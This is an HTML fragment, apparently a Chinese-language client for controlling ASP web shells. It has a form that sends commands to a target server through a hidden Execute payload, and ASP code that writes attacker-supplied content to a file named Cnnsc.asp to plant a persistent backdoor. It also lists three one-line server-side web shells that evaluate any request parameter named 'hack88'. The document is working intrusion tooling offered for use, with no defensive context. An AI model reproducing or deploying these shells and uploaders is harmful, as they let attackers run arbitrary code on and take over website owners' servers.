<tr>
<td height="1" width="794">
<form  method="post" name="pass">
<font color="#000000">服务端网址:</font><input name="act" type="text" id="act" size="84" value="http://"> <input type="submit" value="上传" onClick="this.form.cnnsc.name=this.form.password.value;this.form.action=this.form.act.value;">

登陆密码:<input name="password" type="text" id="password" value="" size="93">
<input type="hidden" name="cnnsc" id="cnnsc" value="Execute(&quot;Session(&quot;&quot;cnnsc&quot;&quot;)=request(&quot;&quot;*&quot;&quot;):Execute(Session(&quot;&quot;cnnsc&quot;&quot;))&quot;)">

</tr>
<tr>
<td height="100" width="794">
<textarea name="*" cols="100" rows="9" width="45">
set lP=server.createObject("Adodb.Stream")
lP.Open
lP.Type=2
lP.CharSet="gb2312"
lP.writetext request("pass")
lP.SaveToFile server.mappath("Cnnsc.asp"),2
lP.Close
set lP=nothing
response.redirect "Cnnsc.asp"</textarea>
</td>
</tr>
<tr>
<td height="1" width="794">

这里输入您的ASP后门代码</textarea>
</td>
</tr>
<tr>
<td width="794" height="7">

<font color="#000000">提供三个服务端:</font>
<br>
1. &lt;%eval request(&quot;<font color="red">hack88</font>&quot;)%&gt;
<br>
2. &lt;%execute request(&quot;<font color="red">hack88</font>&quot;)%&gt;
<br>
3. &lt;%execute(request(&quot;<font color="red">hack88</font>&quot;))%&gt;
<br>
